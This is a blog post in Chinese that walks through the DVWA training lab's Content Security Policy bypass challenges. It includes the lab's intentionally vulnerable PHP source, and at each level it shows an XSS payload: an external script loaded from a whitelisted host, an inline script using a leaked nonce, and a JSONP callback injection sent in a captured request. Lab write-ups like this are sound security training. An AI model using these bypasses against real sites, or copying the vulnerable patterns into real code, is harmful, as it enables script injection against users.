---
layout: post
title: "DVWA CSP Bypass"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_CSP
author: ""
tags: ['DVWA', 'CSP']
---



# DVWA  (CSP) Bypass

###### tags: `DVWA`
Content Security Policy 防止xss 

依靠 http 的header設置。

可以只加載信任的外部js





# Low


code:

```php=
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com  www.k.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.

header($headerCSP);

# These might work if you can't create your own for some reason
# https://pastebin.com/raw/R570EE00
# https://hastebin.com/raw/ohulaquzex

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```





```http=

get request:

http://www.k.com\csp.html



///////////////////////////////////////////////////////////



response http header:

HTTP/1.1 200 OK
Date: Sat, 04 Feb 2023 08:39:44 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
X-Powered-By: PHP/7.3.4
Pragma: no-cache
Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;
Cache-Control: no-cache, must-revalidate
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 4144


```


Content-Security-Policy:
只可以加載這些資源
我們多加一個http://www.k.com (這我自己的)
```
'self' 
https://pastebin.com 
hastebin.com example.com 
code.jquery.com 
https://ssl.google-analytics.com 
http://www.k.com ;
```


然後
http://www.k.com/csp.txt
```
alert("123");
```


你輸入這個網址他就會執行我們的惡意腳本。



# Medium

code:

```php=
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';

```

查看 http response 

unsafe-inline

說明開起內聯腳本。

```
 'self' 
 'unsafe-inline' 
 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
```


這樣就可執行了。
```
<script nonce='TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='>alert(123)</script>
```



# High



http header 只允許自己的腳本。
```
Content-Security-Policy	script-src 'self';
```

high.php
code:
```php=
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';


```





vulnerabilities/csp/source/high.js
```javascript=

//創建script src source/jsonp.php?callback=solveSum  然後加在頁面尾巴
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}


//jsonp.php 會回傳 solveSum函數 參數事json 格式 answer:"15"
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

//抓 button 
var solve_button = document.getElementById ("solve");

// 如果有輸入值，就click button
if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}


```


jsonp.php

接收到 callback 最後丟solveSum 15
```php=
<?php
header("Content-Type: application/json; charset=UTF-8");

if (array_key_exists ("callback", $_GET)) {
	$callback = $_GET['callback'];
} else {
	return "";
}

$outp = array ("answer" => "15");

echo $callback . "(".json_encode($outp).")";
?>

```



了解來龍去脈，可以注入了

BP:
callback=alert("123")
```http=
GET /vulnerabilities/csp/source/jsonp.php?callback=alert("123") HTTP/1.1
Host: www.dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.dvwa.com/vulnerabilities/csp/
Cookie: PHPSESSID=blu64sngigi8i0b91re93q9c09; security=high


```



# Impossible 

跟 high 的差不多，不過他不用callback 而且檔案寫死了，沒機會。


